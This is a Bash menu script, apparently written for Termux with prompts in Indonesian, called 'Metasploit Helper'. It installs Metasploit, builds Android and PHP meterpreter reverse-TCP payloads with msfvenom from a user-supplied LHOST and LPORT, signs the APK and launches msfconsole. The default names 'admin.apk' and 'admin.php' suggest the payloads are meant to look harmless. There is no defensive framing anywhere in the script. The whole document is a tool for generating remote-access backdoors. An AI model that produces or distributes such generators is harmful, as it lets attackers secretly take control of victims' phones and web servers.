a='[30;0m'
n='[0m'
h='[32;1m'
m='[31;1m'
c='[36;1m'
pi='[1;35m'
pu='[1;37m'
k='[33;1m'
clear
echo "$pi"
echo "[¤¤¤]$h    METASPLOIT HELPER $pi   [¤¤¤]"
echo "._________________________________. "
echo "[]                               [] "
echo "[]$pu Author   : Mr.BarBar $pi         [] "
echo "[]$pu Contact  : 6285693587969     $pi [] "
echo "[]_______________________________[]"
echo ""
echo "Note : Sebelum Membuat Payload Diharapkan Untuk"
echo "       Menginstall Metasploit Terlebih Dahulu"
echo $pi"[¤]$h Menu $pi[¤]"
echo ""
echo $pi"[$h 1 $pi].$pu Install Metasploit "
echo $pi"[$h 2 $pi].$pu Buat Payload Aplikasi"
echo $pi"[$h 3 $pi].$pu Buat Payload PHP"
echo $pi"[$h 4 $pi].$pu Sign Aplikasi "
echo $pi"[$h 5 $pi].$pu Jalankan Metasploit "
echo $pi"[$h 6 $pi].$pu Info Script "
echo $pi"[$h 0 $pi].$pu Keluar "
echo ""
echo -n $h"Pilih [1-0] $pu: "
read lol
case $lol in
1)
sleep 1
echo ""
echo $h "[¤]$pu Menginstall Metasploit... "$n
pkg update && pkg upgrade -y
pkg install unstable-repo -y
pkg install metasploit -y
echo " $n "
;;
2)
echo ""
echo ""
echo $pi"[¤¤]$h Buat Payload Aplikasi$pi [¤¤] "
echo ""
echo $pu"Masukan Host Yg Ingin di Gunakan "
echo "(bisa juga menggunakan alamat ip masing2)"
echo -n $pi"[¤]$h lhost $pi: "$h
read lhost
echo ""
echo $pu"Masukan Port Yg Ingin di Gunakan (bebas) "
echo -n $pi"[¤]$h lport $pi: "$h
read lport
echo ""
echo $pu"Masukan Nama Payload (contoh : admin.apk) "
echo -n $pi"[¤]$h nama payload $pi: "$h
read payload
echo ""
sleep 1
echo $pi"________________________________________________"
echo ""
echo $pi"[*]$pu lhost        $pi>$h $lhost "
echo $pi"[*]$pu lport        $pi>$h $lport "
echo $pi"[*]$pu nama payload $pi>$h $payload "
echo $pi"[*]$pu penyimpanan  $pi>$h /sdcard/0 (internal) "
echo $pi"________________________________________________"
echo ""
sleep 1
echo $h"[¤]$pu Membuat Payload... $h[¤]"$n
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$payload
sleep 1
echo ""
echo $pu"[✅]$h payload $payload berhasil di simpan "$n
echo " $n "
;;
3)
echo ""
echo ""
echo $pi"[¤¤]$h Buat Payload PHP$pi [¤¤] "
echo ""
echo $pu"Masukan Host Yg Ingin di Gunakan "
echo "(bisa juga menggunakan alamat ip masing2)"
echo -n $pi"[¤]$h lhost $pi: "$h
read lhost
echo ""
echo $pu"Masukan Port Yg Ingin di Gunakan (bebas) "
echo -n $pi"[¤]$h lport $pi: "$h
read lport
echo ""
echo $pu"Masukan Nama Payload (contoh : admin.php) "
echo -n $pi"[¤]$h nama payload $pi: "$h
read payload
echo ""
sleep 1
echo $pi"________________________________________________"
echo ""
echo $pi"[*]$pu lhost        $pi>$h $lhost "
echo $pi"[*]$pu lport        $pi>$h $lport "
echo $pi"[*]$pu nama payload $pi>$h $payload "
echo $pi"[*]$pu penyimpanan  $pi>$h /sdcard/0 (internal) "
echo $pi"________________________________________________"
echo ""
sleep 1
echo ""
echo $h"[¤]$pu Membuat Payload... $h[¤]"$n
msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$payload
sleep 1
echo ""
echo $pu"[✅]$h payload $payload berhasil disimpan"$n
echo " $n "
;;
4)
echo ""
echo ""
echo $pi"[¤¤]$h Sign Apk $pi [¤¤] "
echo ""
echo $pu"Masukan Nama Apk Tujuan (contoh : admin.apk)"
echo -n $pi"[¤]$h nama apk $pi: "$h
read apk
echo ""
echo $pu"Masukan Nama Hasil Dari Apk Yg di Sign (contoh : hasil.apk) "
echo -n $pi"[¤]$h nama hasil apk $pi: "$h
read hasil
echo ""
sleep 1
echo $h"[¤]$pu Signing Apk... $h[¤]"$n
apksigner -p android keystore $apk $hasil
sleep 4
echo ""
echo $pu"[✅]$h apk $hasil berhasil disimpan"$n
echo " $n "
;;
5)
echo ""
sleep 1
echo $h"[¤]$pu Menjalankan Metasploit... $h[¤]"$n
msfconsole
;;
6)
echo ""
echo "$h"
echo "Nama script  : Metasploit Helper "
echo "Pembuat      : MrBarBar "
echo "Facebook     : -"
echo "B.program    : Bash "
echo "Versi script : v0.1 "
echo ""
echo $pi"[¤]$n script ini fungsinya untuk mempermudah penggunaan metasploit "
echo $pi"[¤]$n payload yg dibuat tersimpan didalam memori internal"
echo $pi"[¤]$n sebelum membuat payload usahakan sudah menginstall metasploit "
echo $pi"[¤]$n jangan lupa kunjungi Contact Saya Jika Ada Yang Eror:v"
echo $h"https://wa.me/6285693587969 "$n
echo " $pi "; cal
echo " $h  "; date
echo ""
echo "$pi         [$pu tekan enter untuk kembali $pi] "$n
read enter
sh help.sh
;;
0)
echo ""
sleep 1
echo $h"Bye Bye... "$n
sleep 1
;;
*)
echo -n $m"[!] Salah Memasukan Pilihan "$n
sleep 1
sh help.sh
esac
